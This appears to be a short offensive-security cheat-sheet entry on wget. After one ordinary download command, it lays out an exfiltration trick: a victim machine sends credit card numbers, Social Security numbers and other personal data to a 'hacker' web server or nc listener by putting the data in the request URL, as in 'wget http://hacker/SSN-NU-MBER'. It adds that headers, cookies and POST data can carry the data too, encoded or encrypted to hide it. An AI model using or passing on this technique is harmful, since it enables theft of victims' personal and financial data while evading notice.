-O force download name into location

wget 192.168.1.102:9999/file.txt  



Alternative use:
Wget accepts any URL as a parameter

Scenario:
Victim machine has CC/SSN/PII on it and you want it
Hacker machine sets up web server/nc listener
Victim machine uses: wget http://hacker/SSN-NU-MBER
Hacker now has a log of SSN Numbers. Works for any data!

Also use other headers/http data. Wget supports --headers.
Cookies, Referrers, POST data, User-Agent, custom headers.
Encrypt or encode the data first if you prefer
